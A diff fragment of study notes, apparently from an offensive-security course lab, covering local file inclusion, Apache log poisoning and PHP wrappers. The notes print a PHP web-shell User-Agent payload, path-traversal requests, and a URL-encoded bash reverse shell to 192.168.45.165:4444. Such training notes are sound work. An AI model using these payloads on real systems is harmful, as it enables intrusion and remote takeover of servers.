@@ -629,10 +629,10 @@
   - write system cmd to access.log file  
     `User-Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>`: embed system cmd  
     `GET /meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.165%2F4444%200%3E%261%22`: run url encoding web shell command
-  - LFI **/opt/admin.bak.php**
+  - LFI **/opt/admin.bak.php**  
     `curl http://mountaindesserts.com:8001/meteor/index.php?page=../../../../../../../../../opt/admin.bak.php`
-  - windows LFI + **Log poisoning** C:\xampp\apache\logs\
-    Modify user agent:  `<?php echo system($_GET['cmd']); ?>`
+  - windows LFI + **Log poisoning** C:\xampp\apache\logs\  
+    Modify user agent:  `<?php echo system($_GET['cmd']); ?>`  
     `GET /meteor/index.php?page=C:/xampp/apache/logs/access.log&cmd=type%20hopefullynobodyfindsthisfilebecauseitssupersecret.txt`
 - 9.2.2 PHP Wrappers
   - LFI **php://filter** to include content of /var/www/html/backup.php  
